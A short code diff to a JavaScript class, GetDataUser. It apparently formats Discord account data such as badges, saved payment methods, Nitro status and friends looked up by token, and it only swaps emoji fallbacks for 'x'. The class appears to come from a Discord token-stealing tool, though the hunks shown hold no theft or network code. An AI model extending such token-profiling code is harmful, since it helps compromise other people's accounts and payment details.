@@ -454,7 +454,7 @@ class GetDataUser {
                 && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                 ? `${result}${CONFIG.badges[badge].emoji} `
                 : result, '',
-            ) || '🚫';
+            ) || 'x';
 
     RareBadges = (flags) =>
         Object.keys(CONFIG.badges)
@@ -473,8 +473,8 @@ class GetDataUser {
             1: '💳',
             2: '<:Paypal:1129073151746252870>'
         };
-        let paymentMethods = data.map(method => payment[method.type] || '🚫').join('');
-        return paymentMethods || '🚫';
+        let paymentMethods = data.map(method => payment[method.type] || 'x').join('');
+        return paymentMethods || 'x';
     }
 
     Friends = async (token) => {
@@ -577,7 +577,7 @@ class GetDataUser {
             nitro = "<:DiscordNitro:587201513873473542>";
         switch (premium_type) {
             default:
-                return "🚫";
+                return "x";
             case 1:
                 return nitro;
             case 2:
